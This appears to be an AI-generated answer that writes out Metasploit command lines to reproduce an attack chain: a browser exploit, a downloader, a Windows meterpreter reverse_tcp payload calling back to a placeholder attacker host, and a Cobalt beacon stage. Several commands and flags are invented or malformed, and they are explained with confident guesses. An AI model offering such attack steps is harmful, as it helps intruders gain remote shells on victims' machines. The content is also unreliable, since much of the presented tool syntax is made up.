Based on the provided documentation and the attack behavior description, I will generate realistic command lines using only the Metasploit tool to reproduce the following attack:

**Initial Exploit**

Command:`browser_exploit_server -z <default_target> -v -c --payload <initial_downloader_payload>`


This command line simulates the initial exploit loading a small downloader. The `-z` option specifies the default target, which is not explicitly provided in the documentation but can be inferred as the most basic case (e.g., English, Windows 7 for a desktop app). The `-v` and `-c` options are likely used to control verbosity and logging, respectively.

**Get Payload**

Command:`get_payload -z <default_target> --payload <initial_downloader_payload>`


This command line generates a target-specific payload for the initial downloader. The `get_payload` method is part of the BrowserExploitServer mixin, which allows us to generate a custom payload based on the specified target.

**Initial Downloader**

Command:`msfvenom -p windows/meterpreter/reverse_tcp <initial_downloader Payload> LHOST=<attacker_ip> LPORT=<attacker_port>`


This command line uses Metasploit's `msfvenom` tool to generate a Windows meterpreter payload for the initial downloader. The payload is specified as `<initial_downloader_payload>`, which was generated earlier using the `get_payload` method. The `LHOST` and `LPORT` options are placeholders for the attacker's IP address and port, respectively.

**Cobalt Beacon Download**

Command:`msfconsole -x "use exploit/multi/http/cobalt_beacon; set <attacker_ip> LHOST=<attacker_ip>; set <attacker_port> LPORT=<attacker_port>; execute" --nolog`


This command line uses Metasploit's `msfconsole` to run the Cobalt beacon exploitation module. The `<attacker_ip>` and `<attacker_port>` placeholders are replaced with actual values specified by the attacker.

**Note:** Since this is a simulated attack, I have not provided actual IP addresses or port numbers for security reasons.
